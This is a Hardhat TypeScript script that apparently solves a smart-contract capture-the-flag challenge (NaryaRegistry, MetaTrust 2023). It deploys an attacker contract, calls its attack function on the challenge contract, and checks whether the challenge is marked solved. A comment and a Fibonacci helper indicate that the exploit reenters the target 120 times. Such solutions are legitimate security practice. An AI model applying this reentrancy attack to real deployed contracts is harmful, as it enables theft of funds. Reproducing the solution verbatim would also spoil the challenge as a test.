import chalk from "chalk";
import { ethers } from "hardhat";
import { NaryaRegistryMetaTrust23__factory, NaryaRegistryMetaTrust23, NaryaRegistryAttackMetatrust23__factory } from "../../typechain";
import { log, initialize } from "../utils";


function findFibonacciN(x:bigint) {
    console.log(x);
    let sum = BigInt(0);
    let prev = BigInt(1);
    let current = BigInt(2);
    let n = 0;
  
    while (sum < x) {
      let temp = current;
      current = prev + current;
      prev = temp;
      sum += prev;
      n++;
    }
    console.log(prev); // the last added number: 22698374052006863956975682
  
    if (sum === x) {
      return n; 
    } else {
      return null; 
    }
  }

async function main() {
    let [NaryaRegistryContract, attacker] = await initialize<NaryaRegistryMetaTrust23>(NaryaRegistryMetaTrust23__factory);
    
    // let n = findFibonacciN(BigInt(59425114757512643212875122n));
    // console.log(n);  // 121, so we should reentry 120 times

    let attackContract = await new NaryaRegistryAttackMetatrust23__factory(attacker).deploy();
    await attackContract.waitForDeployment();
    let tx = await attackContract.attack(await NaryaRegistryContract.getAddress());
    await tx.wait();

    log(`Is solved: ${chalk.yellow(await NaryaRegistryContract.isNaryaHacker(await attackContract.getAddress()))}`);

}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});